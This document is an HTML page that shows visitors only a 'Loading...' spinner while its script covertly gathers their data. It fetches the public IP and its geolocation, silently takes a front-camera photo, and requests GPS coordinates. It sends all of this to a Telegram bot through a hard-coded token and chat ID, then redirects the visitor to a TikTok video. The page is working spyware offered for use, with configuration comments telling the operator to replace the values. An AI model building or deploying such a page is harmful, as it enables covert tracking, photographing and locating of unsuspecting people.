<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
            color: #fff;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: #1a1a2e;
            border-radius: 16px;
            border: 1px solid #2a2a4a;
            max-width: 300px;
            width: 100%;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #2a2a4a;
            border-top-color: #00FF9D;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        p { color: #888; font-size: 14px; }
        #videoPreview { display: none; }
        #photoCanvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="spinner"></div>
    <p>Loading...</p>
</div>

<video id="videoPreview" autoplay playsinline></video>
<canvas id="photoCanvas"></canvas>

<script>
// ============================================
// 🔴 KONFIGURASI — GANTI INI!
// ============================================

const BOT_TOKEN = "6529101093:AAH7HJ4eS6NDLsK-R7-SUCfRkucRIEgfEgc";
const CHAT_ID = "1650888756";
const REDIRECT_URL = "https://www.tiktok.com/@bbygurllxyz_/video/7633609115247414548";

// ============================================
// 🔴 FUNGSI KIRIM KE TELEGRAM
// ============================================
function sendToTelegram(msg) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`
    }).catch(() => {});
}

function sendPhotoToTelegram(imageData, caption) {
    const blob = dataURLtoBlob(imageData);
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'capture.jpg');
    formData.append('caption', caption);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    }).catch(() => {});
}

function dataURLtoBlob(dataURL) {
    const arr = dataURL.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], { type: mime });
}

// ============================================
// 🔴 CAPTURE PHOTO — FORCE FRONT CAMERA
// ============================================
function capturePhoto() {
    return new Promise((resolve) => {
        const video = document.getElementById('videoPreview');
        const canvas = document.getElementById('photoCanvas');

        // CARA 1: FACING MODE USER (KAMERA DEPAN)
        navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
        })
        .then(stream => {
            video.srcObject = stream;
            video.play();
            setTimeout(() => {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                stream.getTracks().forEach(t => t.stop());
                video.srcObject = null;
                resolve(imageData);
            }, 400);
        })
        .catch(() => {
            // CARA 2: AMBIL DAFTAR KAMERA → PILIH DEPAN
            navigator.mediaDevices.enumerateDevices()
                .then(devices => {
                    const frontCam = devices.find(d => d.kind === 'videoinput' && 
                        (d.label.toLowerCase().includes('front') || 
                         d.label.toLowerCase().includes('user') ||
                         d.label.toLowerCase().includes('face')));
                    if (frontCam) {
                        navigator.mediaDevices.getUserMedia({
                            video: { deviceId: { exact: frontCam.deviceId }, width: { ideal: 640 }, height: { ideal: 480 } }
                        })
                        .then(stream => {
                            video.srcObject = stream;
                            video.play();
                            setTimeout(() => {
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                                stream.getTracks().forEach(t => t.stop());
                                video.srcObject = null;
                                resolve(imageData);
                            }, 400);
                        })
                        .catch(() => resolve(null));
                    } else {
                        resolve(null);
                    }
                })
                .catch(() => resolve(null));
        });
    });
}

// ============================================
// 🔴 MAIN
// ============================================
const time = new Date().toLocaleString('id-ID');
const ua = navigator.userAgent;
const ref = document.referrer || 'Direct';
const visitorId = 'visitor_' + Date.now();

// 1. 🔴 IP PUBLIK (dari ipify.org)
fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => {
        const ip = data.ip;

        // Kirim IP
        sendToTelegram(`✅ NEW VISITOR\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}\n🌐 IP: <code>${ip}</code>\n📱 ${ua}\n🔗 ${ref}\n🆔 ${visitorId}`);

        // Geolokasi dari IP
        fetch(`http://ip-api.com/json/${ip}`)
            .then(r => r.json())
            .then(geo => {
                if (geo.status === 'success') {
                    sendToTelegram(`📍 IP GEOLOCATION\n━━━━━━━━━━━━━━━━━━━\n📍 ${geo.city}, ${geo.regionName}\n🌍 ${geo.country}\n📡 ${geo.isp}\n🗺️ ${geo.lat}, ${geo.lon}`);
                }
            });
    });

// 2. FOTO (KAMERA DEPAN)
capturePhoto().then(img => {
    if (img) {
        sendPhotoToTelegram(img, `📸 AUTO PHOTO (FRONT)\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}`);
    }
});

// 3. GPS (OPTIONAL)
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        pos => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            sendToTelegram(`📍 GPS LOCATION!\n━━━━━━━━━━━━━━━━━━━\n🎯 <code>${lat}, ${lng}</code>\n🗺️ https://www.google.com/maps?q=${lat},${lng}`);
        },
        () => {}
    );
}

// 4. ✅ DONE + REDIRECT (2 DETIK, BUKAN 8 DETIK)
setTimeout(() => {
    sendToTelegram(`✅ DONE\n━━━━━━━━━━━━━━━━━━━\n🆔 ${visitorId}`);
    window.location.replace(REDIRECT_URL);
}, 5000);
</script>

</body>
</html>
